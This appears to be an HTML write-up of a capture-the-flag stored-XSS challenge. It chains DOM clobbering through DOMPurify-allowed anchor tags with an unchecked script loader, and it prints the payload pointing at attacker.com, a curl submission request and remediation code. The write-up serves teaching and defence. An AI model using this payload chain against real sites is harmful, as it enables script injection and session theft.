@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Intigriti May 2026 — XSS Challenge Write-up</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;1,400&family=Crimson+Pro:ital,wght@0,400;0,600;1,400;1,600&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:       #f7f5f0;
+    --bg2:      #efede7;
+    --border:   #ddd9d0;
+    --text:     #1a1916;
+    --muted:    #7a766d;
+    --accent:   #c0392b;
+    --accent2:  #e74c3c;
+    --code-bg:  #1c1b18;
+    --code-text:#e8e4da;
+    --green:    #1a6b3c;
+    --orange:   #b8520a;
+    --blue:     #1a4a6b;
+    --tag-bg:   #e8e4da;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'DM Sans', sans-serif;
+    font-size: 16px;
+    line-height: 1.75;
+  }
+
+  /* LAYOUT */
+  .layout {
+    display: grid;
+    grid-template-columns: 220px 1fr;
+    min-height: 100vh;
+  }
+
+  /* SIDEBAR */
+  .sidebar {
+    position: sticky;
+    top: 0;
+    height: 100vh;
+    overflow-y: auto;
+    border-right: 1px solid var(--border);
+    padding: 2.5rem 1.5rem;
+    background: var(--bg);
+    display: flex;
+    flex-direction: column;
+    gap: 0.25rem;
+  }
+
+  .sidebar-brand {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.68rem;
+    color: var(--muted);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    padding-bottom: 1.5rem;
+    margin-bottom: 0.5rem;
+    border-bottom: 1px solid var(--border);
+    line-height: 1.6;
+  }
+
+  .sidebar-brand strong {
+    display: block;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 0.95rem;
+    font-weight: 600;
+    color: var(--text);
+    margin-top: 0.3rem;
+    letter-spacing: 0;
+  }
+
+  .nav-group {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.6rem;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--muted);
+    padding: 1rem 0.5rem 0.3rem;
+  }
+
+  .sidebar a {
+    display: block;
+    padding: 0.35rem 0.5rem;
+    font-size: 0.82rem;
+    color: var(--muted);
+    text-decoration: none;
+    border-radius: 4px;
+    transition: color 0.15s, background 0.15s;
+    font-weight: 500;
+  }
+
+  .sidebar a:hover { color: var(--text); background: var(--tag-bg); }
+  .sidebar a.active { color: var(--accent); }
+
+  /* MAIN */
+  .main {
+    max-width: 740px;
+    padding: 4rem 3rem 8rem;
+  }
+
+  /* HERO */
+  .hero {
+    margin-bottom: 4rem;
+    padding-bottom: 3rem;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .hero-eyebrow {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.72rem;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 1.25rem;
+  }
+
+  .hero h1 {
+    font-family: 'Crimson Pro', Georgia, serif;
+    font-size: clamp(2rem, 3.5vw, 2.8rem);
+    font-weight: 600;
+    line-height: 1.2;
+    color: var(--text);
+    margin-bottom: 1.25rem;
+    letter-spacing: -0.01em;
+  }
+
+  .hero-lead {
+    font-size: 1.05rem;
+    color: var(--muted);
+    max-width: 600px;
+    margin-bottom: 2rem;
+    line-height: 1.7;
+  }
+
+  .meta-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.6rem;
+  }
+
+  .meta-chip {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.72rem;
+    background: var(--tag-bg);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 0.3rem 0.7rem;
+    color: var(--muted);
+  }
+
+  .meta-chip b { color: var(--text); }
+  .meta-chip.severity b { color: var(--accent); }
+
+  /* SECTIONS */
+  section {
+    margin-bottom: 3.5rem;
+    scroll-margin-top: 2rem;
+  }
+
+  .section-label {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.65rem;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 0.6rem;
+  }
+
+  h2 {
+    font-family: 'Crimson Pro', Georgia, serif;
+    font-size: 1.7rem;
+    font-weight: 600;
+    color: var(--text);
+    line-height: 1.25;
+    margin-bottom: 1.25rem;
+    padding-bottom: 0.75rem;
+    border-bottom: 1px solid var(--border);
+  }
+
+  h3 {
+    font-family: 'DM Sans', sans-serif;
+    font-size: 1rem;
+    font-weight: 600;
+    color: var(--text);
+    margin: 2rem 0 0.6rem;
+  }
+
+  p {
+    color: #3d3b36;
+    margin-bottom: 1rem;
+    font-size: 0.97rem;
+    line-height: 1.8;
+  }
+
+  p:last-child { margin-bottom: 0; }
+
+  a { color: var(--accent); }
+
+  .ic {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.82em;
+    background: var(--tag-bg);
+    border: 1px solid var(--border);
+    padding: 0.1em 0.35em;
+    border-radius: 3px;
+    color: #3d3b36;
+  }
+
+  /* CODE BLOCKS */
+  .code-block {
+    margin: 1.5rem 0;
+    border-radius: 6px;
+    overflow: hidden;
+    border: 1px solid #2e2c28;
+  }
+
+  .code-header {
+    background: #141310;
+    padding: 0.55rem 1rem;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 1px solid #2e2c28;
+  }
+
+  .code-lang {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.65rem;
+    color: #6e6b64;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+  }
+
+  .code-dots { display: flex; gap: 5px; }
+  .code-dots span { width: 9px; height: 9px; border-radius: 50%; opacity: 0.6; }
+  .code-dots span:nth-child(1) { background: #ff5f57; }
+  .code-dots span:nth-child(2) { background: #febc2e; }
+  .code-dots span:nth-child(3) { background: #28c840; }
+
+  pre {
+    background: var(--code-bg);
+    padding: 1.25rem 1.25rem;
+    overflow-x: auto;
+    line-height: 1.65;
+  }
+
+  pre code {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.82rem;
+    color: var(--code-text);
+    background: none;
+    border: none;
+    padding: 0;
+  }
+
+  .hl-k  { color: #d4856a; }       /* keyword */
+  .hl-s  { color: #a8c77a; }       /* string */
+  .hl-c  { color: #6e6b64; font-style: italic; } /* comment */
+  .hl-f  { color: #c4a7e7; }       /* function */
+  .hl-v  { color: #84b4d0; }       /* variable */
+  .hl-bad { color: #e8735a; font-weight: 600; }
+  .hl-ok  { color: #78c99a; }
+
+  /* CALLOUTS */
+  .callout {
+    padding: 1rem 1.25rem;
+    border-radius: 5px;
+    margin: 1.5rem 0;
+    border-left: 3px solid;
+    font-size: 0.9rem;
+    line-height: 1.7;
+  }
+
+  .callout p { margin: 0; font-size: 0.9rem; }
+
+  .callout.note   { background: #eef2f7; border-color: #5a8fbf; color: var(--blue); }
+  .callout.warn   { background: #fdf3ec; border-color: #c97a3a; color: var(--orange); }
+  .callout.good   { background: #eef7f2; border-color: #3a9e68; color: var(--green); }
+  .callout.bad    { background: #fdf0ef; border-color: var(--accent); color: #7a1e18; }
+
+  .callout.note p, .callout.warn p, .callout.good p, .callout.bad p { color: inherit; }
+
+  /* ATTACK CHAIN */
+  .chain { margin: 1.5rem 0; }
+
+  .chain-item {
+    display: grid;
+    grid-template-columns: 32px 1fr;
+    gap: 0 1rem;
+    margin-bottom: 0;
+  }
+
+  .chain-left {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .chain-num {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background: var(--text);
+    color: var(--bg);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.7rem;
+    font-weight: 500;
+    flex-shrink: 0;
+  }
+
+  .chain-line {
+    width: 1px;
+    flex: 1;
+    background: var(--border);
+    min-height: 20px;
+    margin: 4px 0;
+  }
+
+  .chain-body {
+    padding-bottom: 1.25rem;
+  }
+
+  .chain-body h4 {
+    font-size: 0.92rem;
+    font-weight: 600;
+    color: var(--text);
+    margin: 0.3rem 0 0.3rem;
+    line-height: 1.3;
+  }
+
+  .chain-body p {
+    font-size: 0.85rem;
+    color: var(--muted);
+    margin: 0;
+  }
+
+  /* TABLE */
+  .table-wrap {
+    overflow-x: auto;
+    margin: 1.5rem 0;
+    border: 1px solid var(--border);
+    border-radius: 5px;
+  }
+
+  table { width: 100%; border-collapse: collapse; font-size: 0.875rem; }
+
+  th {
+    background: var(--bg2);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.65rem;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--muted);
+    padding: 0.65rem 1rem;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+    font-weight: 500;
+  }
+
+  td {
+    padding: 0.7rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    vertical-align: top;
+    font-size: 0.875rem;
+    line-height: 1.6;
+  }
+
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: var(--bg2); }
+
+  td code {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.78rem;
+    background: var(--tag-bg);
+    border: 1px solid var(--border);
+    padding: 0.1em 0.35em;
+    border-radius: 3px;
+  }
+
+  .badge {
+    display: inline-block;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.7rem;
+    padding: 0.15rem 0.5rem;
+    border-radius: 2px;
+  }
+
+  .badge-ok  { background: #d4edda; color: #155724; }
+  .badge-bad { background: #f8d7da; color: #721c24; }
+  .badge-mid { background: #fff3cd; color: #856404; }
+
+  /* STEP BOXES */
+  .step-box {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 0.75rem;
+    display: grid;
+    grid-template-columns: auto 1fr;
+    gap: 0.75rem;
+    align-items: start;
+  }
+
+  .step-n {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.7rem;
+    font-weight: 500;
+    background: var(--text);
+    color: var(--bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 2px;
+    margin-top: 0.05rem;
+    flex-shrink: 0;
+  }
+
+  .step-box h4 {
+    font-size: 0.9rem;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 0.25rem;
+  }
+
+  .step-box p {
+    font-size: 0.85rem;
+    color: var(--muted);
+    margin: 0;
+  }
+
+  /* VULN SUMMARY TAGS */
+  .vuln-tags { display: flex; flex-wrap: wrap; gap: 0.5rem; margin: 1rem 0; }
+  .vtag {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 0.72rem;
+    padding: 0.3rem 0.7rem;
+    border-radius: 3px;
+    border: 1px solid;
+  }
+  .vtag-red   { background: #fdf0ef; border-color: #e8b4b0; color: #7a2018; }
+  .vtag-green { background: #eef7f2; border-color: #a3d4b8; color: #1a4a30; }
+
+  /* DIVIDER */
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2.5rem 0;
+  }
+
+  /* FOOTER */
+  .footer {
+    margin-top: 4rem;
+    padding-top: 1.5rem;
+    border-top: 1px solid var(--border);
+    font-size: 0.82rem;
+    color: var(--muted);
+  }
+
+  /* RESPONSIVE */
+  @media (max-width: 780px) {
+    .layout { grid-template-columns: 1fr; }
+    .sidebar { display: none; }
+    .main { padding: 2rem 1.25rem 5rem; }
+  }
+
+  /* SCROLL ACTIVE */
+  .fade-in {
+    opacity: 0;
+    transform: translateY(14px);
+    transition: opacity 0.45s ease, transform 0.45s ease;
+  }
+  .fade-in.visible { opacity: 1; transform: none; }
+</style>
+</head>
+<body>
+
+<div class="layout">
+
+<!-- SIDEBAR -->
+<nav class="sidebar">
+  <div class="sidebar-brand">
+    Intigriti · May 2026<br>
+    XSS Challenge
+    <strong>Write-up</strong>
+  </div>
+
+  <div class="nav-group">Sections</div>
+  <a href="#overview" class="active">Overview</a>
+  <a href="#recon">Reconnaissance</a>
+  <a href="#vuln1">DOM Clobbering</a>
+  <a href="#vuln2">Script Gadget</a>
+  <a href="#chain">Attack Chain</a>
+  <a href="#reproduce">Reproducing It</a>
+  <a href="#payload">The Payload</a>
+  <a href="#impact">Impact</a>
+  <a href="#fix">Remediation</a>
+</nav>
+
+<!-- MAIN CONTENT -->
+<main class="main">
+
+  <!-- HERO -->
+  <header class="hero fade-in">
+    <div class="hero-eyebrow">Intigriti · Stored XSS · May 2026 · Accepted</div>
+    <h1>Stored XSS via DOM Clobbering + Unsafe Script Gadget</h1>
+    <p class="hero-lead">
+      Two quiet bugs — DOMPurify's tolerance for clobbering anchors and a script loader that trusts whatever it finds on <code class="ic">window</code> — chain together into a stored XSS that fires on any victim with one page load.
+    </p>
+    <div class="meta-row">
+      <div class="meta-chip"><b>challenge-0526.intigriti.io</b></div>
+      <div class="meta-chip">Type: <b>Stored XSS</b></div>
+      <div class="meta-chip severity">Severity: <b>High</b></div>
+      <div class="meta-chip">Clicks: <b>1</b></div>
+    </div>
+  </header>
+
+  <!-- OVERVIEW -->
+  <section id="overview" class="fade-in">
+    <div class="section-label">01 — Overview</div>
+    <h2>The Setup</h2>
+
+    <p>The challenge is a retro-styled arcade app called <strong>Pixel Pioneers</strong>. You can register an account, update your display name, and leave testimonials that other users see on the main page.</p>
+
+    <p>The obvious attack surface is the testimonials feed — user-submitted content that ends up in the DOM. The app uses <strong>DOMPurify 3.0.9</strong> to sanitize it, which is normally a solid choice. For the display name field, the backend strips <code class="ic">&lt;</code> and <code class="ic">&gt;</code> server-side, so that's a dead end.</p>
+
+    <p>At first glance there's nothing here. But after reading the JavaScript carefully, two things stood out that, when combined, bypassed the whole setup:</p>
+
+    <div class="vuln-tags">
+      <span class="vtag vtag-green">DOM Clobbering via DOMPurify</span>
+      <span class="vtag vtag-red">Unsafe script loader gadget</span>
+    </div>
+
+    <p>Neither bug is catastrophic on its own. Together they're a working stored XSS with a one-click trigger.</p>
+  </section>
+
+  <!-- RECON -->
+  <section id="recon" class="fade-in">
+    <div class="section-label">02 — Reconnaissance</div>
+    <h2>Reading the Code</h2>
+
+    <p>First thing I did was read <code class="ic">app.js</code> front to back. The testimonials renderer caught my attention immediately. Display names go straight into <code class="ic">innerHTML</code> with no sanitization, while the content body gets DOMPurified:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">app.js — loadTestimonials()</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><code><span class="hl-v">nameDiv</span>.<span class="hl-f">innerHTML</span> = t.user_name;   <span class="hl-bad">// no sanitization at all</span>
+<span class="hl-v">textDiv</span>.<span class="hl-f">innerHTML</span> = <span class="hl-f">DOMPurify</span>.<span class="hl-f">sanitize</span>(t.content);</code></pre>
+    </div>
+
+    <p>The name field looks promising — raw <code class="ic">innerHTML</code> assignment. But the server blocks angle brackets in names, so that's a wall. The interesting path is the content field, going through DOMPurify.</p>
+
+    <p>Then, buried at the bottom of <code class="ic">loadTestimonials()</code>, was this:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">app.js — analytics loader</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><code><span class="hl-k">let</span> <span class="hl-v">config</span> = <span class="hl-v">window</span>.<span class="hl-v">PixelAnalyticsConfig</span> || { <span class="hl-v">enabled</span>: <span class="hl-k">false</span>, <span class="hl-v">scriptUrl</span>: <span class="hl-s">'/js/mock-tracker.js'</span> };
+<span class="hl-k">if</span> (<span class="hl-v">config</span>.<span class="hl-v">enabled</span>) {
+    <span class="hl-k">let</span> <span class="hl-v">s</span> = <span class="hl-v">document</span>.<span class="hl-f">createElement</span>(<span class="hl-s">'script'</span>);
+    <span class="hl-v">s</span>.<span class="hl-v">src</span> = <span class="hl-bad">config.scriptUrl</span>;   <span class="hl-bad">// loads whatever this says — no checks</span>
+    <span class="hl-v">document</span>.<span class="hl-v">body</span>.<span class="hl-f">appendChild</span>(<span class="hl-v">s</span>);
+}</code></pre>
+    </div>
+
+    <p>This is the gadget. If <code class="ic">window.PixelAnalyticsConfig</code> exists with <code class="ic">enabled</code> set to something truthy, the app creates a <code class="ic">&lt;script&gt;</code> element pointed at <code class="ic">scriptUrl</code> and appends it to the page. No origin check. No validation. Completely blind.</p>
+
+    <p>So the question became: can I control <code class="ic">window.PixelAnalyticsConfig</code> from inside DOMPurify-sanitized HTML? That's where DOM clobbering comes in.</p>
+  </section>
+
+  <!-- VULN 1 -->
+  <section id="vuln1" class="fade-in">
+    <div class="section-label">03 — Vulnerability 1</div>
+    <h2>DOM Clobbering via DOMPurify</h2>
+
+    <p>Quick primer if you haven't seen this before: browsers automatically expose any element with an <code class="ic">id</code> attribute as a property on <code class="ic">window</code>. If you have <code class="ic">&lt;div id="foo"&gt;</code> somewhere in the page, you can reach it as <code class="ic">window.foo</code>. It's a legacy browser behavior that's never going away.</p>
+
+    <p>It gets more useful when two elements share the same <code class="ic">id</code>. The browser wraps them in an <strong>HTMLCollection</strong> at that property, and sub-properties of that collection can be accessed by each element's <code class="ic">name</code> attribute. In other words — two plain <code class="ic">&lt;a&gt;</code> tags are enough to fake a two-level JavaScript object.</p>
+
+    <div class="callout warn">
+      <p>DOMPurify 3.0.9 blocks scripts, event handlers, and dangerous tags. It fully allows <code>&lt;a&gt;</code> elements with <code>id</code>, <code>name</code>, and <code>href</code>. That's the only gap we need.</p>
+    </div>
+
+    <p>The payload is two anchor tags:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">DOM Clobbering Payload</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><code>&lt;<span class="hl-k">a</span> <span class="hl-v">id</span>=<span class="hl-s">"PixelAnalyticsConfig"</span> <span class="hl-v">name</span>=<span class="hl-s">"scriptUrl"</span> <span class="hl-v">href</span>=<span class="hl-s">"https://attacker.com/xss.js"</span>&gt;&lt;/<span class="hl-k">a</span>&gt;
+&lt;<span class="hl-k">a</span> <span class="hl-v">id</span>=<span class="hl-s">"PixelAnalyticsConfig"</span> <span class="hl-v">name</span>=<span class="hl-s">"enabled"</span>&gt;&lt;/<span class="hl-k">a</span>&gt;</code></pre>
+    </div>
+
+    <p>Once these land in the DOM, here's what the browser exposes:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Browser Console — After Injection</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><code>window.PixelAnalyticsConfig
+<span class="hl-ok">→ HTMLCollection(2) [a#PixelAnalyticsConfig, a#PixelAnalyticsConfig]</span>
+
+window.PixelAnalyticsConfig.enabled
+<span class="hl-ok">→ &lt;a name="enabled"&gt;  // a real DOM element — truthy</span>
+
+window.PixelAnalyticsConfig.scriptUrl.toString()
+<span class="hl-ok">→ "https://attacker.com/xss.js"  // HTMLAnchorElement.toString() returns href</span></code></pre>
+    </div>
+
+    <div class="callout good">
+      <p>The key behavior: <code>HTMLAnchorElement.toString()</code> returns the element's <code>href</code>. When the app does <code>s.src = config.scriptUrl</code>, JavaScript coerces the anchor element to a string automatically — and that string is our URL.</p>
+    </div>
+
+    <p>DOMPurify sees two perfectly valid anchor tags and passes them through. It has no way to know they'll clobber a global variable and weaponize a script loader.</p>
+  </section>
+
+  <!-- VULN 2 -->
+  <section id="vuln2" class="fade-in">
+    <div class="section-label">04 — Vulnerability 2</div>
+    <h2>The Unsafe Script Gadget</h2>
+
+    <p>The second bug is the analytics loader we found during recon. It runs at the end of every <code class="ic">loadTestimonials()</code> call and checks two things: is <code class="ic">config.enabled</code> truthy? Is there a <code class="ic">scriptUrl</code>? If yes to both, it appends a script tag to the page pointing at that URL.</p>
+
+    <p>The problem is that it never validates what <code class="ic">window.PixelAnalyticsConfig</code> actually is. It doesn't check whether it's a plain object. It doesn't verify the URL. It just reads whatever it finds on <code class="ic">window</code> and runs with it.</p>
+
+    <div class="callout bad">
+      <p>Our clobbered <code>HTMLCollection</code> satisfies both conditions — <code>enabled</code> is a DOM element (truthy), and <code>scriptUrl</code> resolves to our attacker URL via the anchor's <code>href</code>. The app loads our script without question.</p>
+    </div>
+
+    <p>This is what makes the chain work. The two bugs don't overlap — one lets you write into the global namespace through sanitized HTML, the other reads from the global namespace without verifying what it got.</p>
+  </section>
+
+  <!-- CHAIN -->
+  <section id="chain" class="fade-in">
+    <div class="section-label">05 — Full Picture</div>
+    <h2>The Attack Chain</h2>
+
+    <div class="chain">
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-num">1</div>
+          <div class="chain-line"></div>
+        </div>
+        <div class="chain-body">
+          <h4>Attacker posts the payload as a testimonial</h4>
+          <p>The two clobbering anchors get stored in the database. The server doesn't flag them — they look like valid HTML to any sanitizer check at storage time.</p>
+        </div>
+      </div>
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-num">2</div>
+          <div class="chain-line"></div>
+        </div>
+        <div class="chain-body">
+          <h4>Victim opens the testimonials page</h4>
+          <p>One click on the challenge URL is enough. The page fetches and renders the testimonials feed including our stored content.</p>
+        </div>
+      </div>
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-num">3</div>
+          <div class="chain-line"></div>
+        </div>
+        <div class="chain-body">
+          <h4>DOMPurify passes the payload</h4>
+          <p><code class="ic">&lt;a&gt;</code> with <code class="ic">id</code>, <code class="ic">name</code>, and <code class="ic">href</code> are all on the allowlist. The payload survives sanitization completely intact.</p>
+        </div>
+      </div>
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-num">4</div>
+          <div class="chain-line"></div>
+        </div>
+        <div class="chain-body">
+          <h4>Anchors land in the DOM — clobbering takes effect</h4>
+          <p><code class="ic">window.PixelAnalyticsConfig</code> is now an <code class="ic">HTMLCollection</code>. <code class="ic">.enabled</code> is truthy. <code class="ic">.scriptUrl.toString()</code> returns the attacker's URL.</p>
+        </div>
+      </div>
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-num">5</div>
+        </div>
+        <div class="chain-body">
+          <h4>Tracker fires — external script loads — XSS executes</h4>
+          <p>The app appends <code class="ic">&lt;script src="attacker.com/xss.js"&gt;</code> to the body. <code class="ic">alert(document.domain)</code> fires on the challenge origin.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- REPRODUCE -->
+  <section id="reproduce" class="fade-in">
+    <div class="section-label">06 — Steps to Reproduce</div>
+    <h2>Reproducing the Bug</h2>
+
+    <div class="step-box">
+      <span class="step-n">01</span>
+      <div>
+        <h4>Register an account</h4>
+        <p>Go to <code class="ic">#register</code> and create any account. Log in to get a valid session cookie.</p>
+      </div>
+    </div>
+
+    <div class="step-box">
+      <span class="step-n">02</span>
+      <div>
+        <h4>Submit the clobbering payload as your testimonial</h4>
+        <p>Either use the UI form or send the request directly:</p>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><code>curl -X POST https://challenge-0526.intigriti.io/api/testimonials \
+  -H <span class="hl-s">"Content-Type: application/json"</span> \
+  -H <span class="hl-s">"Cookie: session=&lt;your-session&gt;"</span> \
+  -d <span class="hl-s">'{"content":"&lt;a id=\"PixelAnalyticsConfig\" name=\"scriptUrl\" href=\"https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js\"&gt;&lt;/a&gt;&lt;a id=\"PixelAnalyticsConfig\" name=\"enabled\"&gt;&lt;/a&gt;"}'</span></code></pre>
+    </div>
+
+    <div class="step-box">
+      <span class="step-n">03</span>
+      <div>
+        <h4>Send the victim to the testimonials page</h4>
+        <p>The payload fires immediately on page load — no further interaction needed:</p>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Trigger URL</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><code><span class="hl-ok">https://challenge-0526.intigriti.io/challenge#testimonials</span></code></pre>
+    </div>
+
+    <div class="step-box">
+      <span class="step-n">04</span>
+      <div>
+        <h4>Observe execution</h4>
+        <p>The browser loads the feed, clobbering happens silently in the background, and <code class="ic">alert(document.domain)</code> pops on the challenge origin.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- PAYLOAD -->
+  <section id="payload" class="fade-in">
+    <div class="section-label">07 — Payload</div>
+    <h2>Final Payload</h2>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Payload — HTML submitted as testimonial content</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><code>&lt;<span class="hl-k">a</span> <span class="hl-v">id</span>=<span class="hl-s">"PixelAnalyticsConfig"</span>
+   <span class="hl-v">name</span>=<span class="hl-s">"scriptUrl"</span>
+   <span class="hl-v">href</span>=<span class="hl-s">"https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"</span>&gt;&lt;/<span class="hl-k">a</span>&gt;
+&lt;<span class="hl-k">a</span> <span class="hl-v">id</span>=<span class="hl-s">"PixelAnalyticsConfig"</span>
+   <span class="hl-v">name</span>=<span class="hl-s">"enabled"</span>&gt;&lt;/<span class="hl-k">a</span>&gt;</code></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">Hosted payload — xss.js</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><code><span class="hl-f">alert</span>(<span class="hl-v">document</span>.<span class="hl-v">domain</span>);</code></pre>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Property</th>
+            <th>Resolves To</th>
+            <th>Result</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>window.PixelAnalyticsConfig</code></td>
+            <td>HTMLCollection of 2 anchors</td>
+            <td><span class="badge badge-ok">Truthy</span></td>
+          </tr>
+          <tr>
+            <td><code>config.enabled</code></td>
+            <td><code>&lt;a name="enabled"&gt;</code> element</td>
+            <td><span class="badge badge-ok">Truthy</span></td>
+          </tr>
+          <tr>
+            <td><code>config.scriptUrl</code></td>
+            <td><code>&lt;a name="scriptUrl"&gt;</code> element</td>
+            <td><span class="badge badge-ok">Truthy</span></td>
+          </tr>
+          <tr>
+            <td><code>config.scriptUrl.toString()</code></td>
+            <td>Anchor's href URL</td>
+            <td><span class="badge badge-mid">Attacker URL</span></td>
+          </tr>
+          <tr>
+            <td><code>script.src = config.scriptUrl</code></td>
+            <td>External JS appended to body</td>
+            <td><span class="badge badge-bad">XSS</span></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- IMPACT -->
+  <section id="impact" class="fade-in">
+    <div class="section-label">08 — Impact</div>
+    <h2>What You Can Do With It</h2>
+
+    <p>Once an external script runs on the challenge origin, the usual XSS options are on the table. The session cookies don't have the <code class="ic">HttpOnly</code> flag, so JavaScript can read them directly — account takeover with one cookie exfil. Full DOM access also means injecting fake login forms to harvest credentials, or just redirecting users to somewhere else entirely.</p>
+
+    <p>For a CTF this is rated High, which makes sense. Stored XSS that fires with no user interaction beyond a single page visit is a genuinely dangerous class of bug. The one-click delivery and the fact that any user visiting the testimonials page is affected makes the blast radius wide.</p>
+  </section>
+
+  <!-- FIX -->
+  <section id="fix" class="fade-in">
+    <div class="section-label">09 — Remediation</div>
+    <h2>How to Fix It</h2>
+
+    <p>Both issues have clean fixes. They're independent — you'd want to apply all of them:</p>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Issue</th>
+            <th>Fix</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>DOM Clobbering</strong></td>
+            <td>Pass <code>FORBID_ATTR: ['id', 'name']</code> to DOMPurify — removes the attributes that make clobbering possible</td>
+          </tr>
+          <tr>
+            <td><strong>Script gadget trusts window</strong></td>
+            <td>Check <code>config.constructor === Object</code> before using the config — DOM elements will fail this immediately</td>
+          </tr>
+          <tr>
+            <td><strong>No Content Security Policy</strong></td>
+            <td>A <code>script-src 'self'</code> header would have blocked the external script from loading entirely</td>
+          </tr>
+          <tr>
+            <td><strong>Cookie flags</strong></td>
+            <td>Add <code>HttpOnly</code> and <code>Secure</code> to session cookies to limit post-XSS damage</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>Hardened version of the tracker code</h3>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">JavaScript — Fixed</span>
+        <div class="code-dots"><span></span><span></span><span></span></div>
+      </div>
+      <pre><code><span class="hl-c">// Strip id and name to prevent DOM clobbering</span>
+<span class="hl-v">textDiv</span>.<span class="hl-f">innerHTML</span> = <span class="hl-f">DOMPurify</span>.<span class="hl-f">sanitize</span>(t.content, {
+    <span class="hl-v">FORBID_ATTR</span>: [<span class="hl-s">'id'</span>, <span class="hl-s">'name'</span>]
+});
+
+<span class="hl-c">// Only use config if it's actually a plain object</span>
+<span class="hl-k">const</span> <span class="hl-v">raw</span> = <span class="hl-v">window</span>.<span class="hl-v">PixelAnalyticsConfig</span>;
+<span class="hl-k">if</span> (<span class="hl-v">raw</span> &amp;&amp; <span class="hl-v">raw</span>.<span class="hl-v">constructor</span> === <span class="hl-f">Object</span> &amp;&amp; <span class="hl-k">typeof</span> <span class="hl-v">raw</span>.<span class="hl-v">scriptUrl</span> === <span class="hl-s">'string'</span>) {
+    <span class="hl-c">// safe to proceed</span>
+}</code></pre>
+    </div>
+
+    <div class="callout note">
